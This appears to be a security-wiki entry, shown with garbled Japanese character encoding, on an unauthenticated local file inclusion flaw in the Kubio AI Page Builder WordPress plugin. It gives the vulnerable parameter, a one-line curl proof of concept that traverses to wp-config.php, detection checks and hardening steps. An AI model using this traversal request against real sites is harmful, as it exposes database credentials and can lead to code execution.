## èªè¨¼ä¸è¦ã® Local File Inclusion â€” æœªæ¤œè¨¼ã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆ/ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹çµŒç”± (Kubio AI Page Builder â‰¤ 2.5.1)

ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã§æ­£è¦åŒ–/ã‚³ãƒ³ãƒ†ã‚¤ãƒ³ãƒ¡ãƒ³ãƒˆã›ãšã«æ”»æ’ƒè€…åˆ¶å¾¡ã®ãƒ‘ã‚¹ã‚’å—ã‘å…¥ã‚Œã‚‹ã¨ã€ä»»æ„ã®ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿å–ã‚ŠãŒå¯èƒ½ã«ãªã‚Šã€includable PHP/log files ãŒãƒ©ãƒ³ã‚¿ã‚¤ãƒ ã«å–ã‚Šè¾¼ã¾ã‚Œã‚‹å ´åˆã¯ã‚³ãƒ¼ãƒ‰å®Ÿè¡Œã«ãªã‚‹ã“ã¨ãŒã‚ã‚‹ã€‚

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: æ­£è¦åŒ–/allowlistingãªã—ï¼›traversalãŒå¯èƒ½
- Impact: æ©Ÿå¯†æƒ…å ±ã®é–‹ç¤ºï¼ˆwp-config.phpï¼‰ã€ç‰¹å®šç’°å¢ƒã§ã¯ RCE ã®å¯èƒ½æ€§ï¼ˆlog poisoningã€includable PHPï¼‰

PoC â€“ wp-config.php ã‚’èª­ã¿å–ã‚‹
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
æ¤œå‡ºãƒã‚§ãƒƒã‚¯ãƒªã‚¹ãƒˆ
- realpath() ã«ã‚ˆã‚‹åŒ…å«ç¢ºèªãªã—ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ‘ã‚¹ã‚’ include()/require()/read ã‚·ãƒ³ã‚¯ã«é€£çµã—ã¦ã„ã‚‹ãƒãƒ³ãƒ‰ãƒ©ãŒãªã„ã‹ç¢ºèªã™ã‚‹
- æ„å›³ã—ãŸ templates ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®å¤–ã«å‡ºã‚‹ traversal ãƒ‘ã‚¿ãƒ¼ãƒ³ (../) ã‚’æ¢ã™

å …ç‰¢åŒ–
- è¨±å¯ãƒªã‚¹ãƒˆåŒ–ã•ã‚ŒãŸãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’å¼·åˆ¶ã™ã‚‹ã€‚realpath() ã§è§£æ±ºã—ã€require str_starts_with(realpath(file), realpath(allowed_base)) ã‚’è¦æ±‚ã™ã‚‹
- å…¥åŠ›ã‚’æ­£è¦åŒ–ã™ã‚‹ã€‚traversal ã‚·ãƒ¼ã‚±ãƒ³ã‚¹ã‚„çµ¶å¯¾ãƒ‘ã‚¹ã‚’æ‹’å¦ã™ã‚‹ã€‚sanitize_file_name() ã¯ãƒ•ã‚¡ã‚¤ãƒ«åã®ã¿ï¼ˆãƒ•ãƒ«ãƒ‘ã‚¹ã§ã¯ãªãï¼‰ã«ä½¿ç”¨ã™ã‚‹


## References

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025â€™s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) â‰¤ 1.0.82 â€“ Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations â‰¤ 3.5.3 â€“ Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider â‰¤ 3.6.1 â€“ Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder â‰¤ 2.5.1 â€“ Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
